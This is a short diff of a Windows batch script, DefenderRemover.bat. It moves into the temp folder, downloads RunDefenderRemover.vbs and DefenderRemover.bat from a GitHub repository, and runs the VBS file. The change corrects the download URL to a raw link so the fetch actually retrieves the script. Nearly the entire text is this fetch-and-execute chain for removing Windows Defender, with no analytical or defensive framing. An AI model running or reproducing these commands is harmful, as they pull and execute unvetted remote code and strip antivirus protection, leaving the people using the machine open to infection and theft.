@@ -31,7 +31,7 @@ DefenderRemover.bat
 
 cd %temp%
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RunDefenderRemover.vbs -o RunDefenderRemover.vbs
-curl https://github.com/seition2doc/dosta2/blob/main/DefenderRemover.bat -o DefenderRemover.bat 
+curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/DefenderRemover.bat -o DefenderRemover.bat 
 
 RunDefenderRemover.vbs
 
